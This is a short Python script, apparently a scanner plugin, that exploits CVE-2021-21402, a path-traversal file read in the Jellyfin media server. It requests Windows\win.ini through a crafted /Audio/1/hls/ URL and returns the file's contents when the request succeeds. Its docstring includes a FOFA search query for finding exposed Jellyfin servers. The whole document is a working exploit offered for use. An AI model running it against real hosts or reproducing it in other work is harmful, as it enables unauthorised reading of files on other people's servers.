#coding:utf-8
import requests
import urllib3
# ...
urllib3.disable_warnings()

def verify(host,proxy):
    """
    Jellyfin任意文件读取  
    CVE-2021-21402  
    fofa:title="Jellyfin"  
    """

    # global vul_list
    # vul_list[1] = sys._getframe().f_code.co_name#获取当前函数名
    vuln = [False,""]
    url = "http://" + host + "/Audio/1/hls/..\..\..\..\..\..\..\Windows\win.ini/stream.mp3/"
    if proxy:
        proxies = {
        "http": "http://%s"%(proxy),
        "https": "http://%s"%(proxy),
        }
    try:
        if proxy:
            req = requests.get(url,timeout = 6,proxies=proxies,verify = False)
        else:
            req = requests.get(url,timeout = 6,verify = False)
        if req.status_code == 200 and req.text is not None:
            vuln = [True,req.text]
    except Exception as e:
        raise e
    
    return vuln
# print "yes"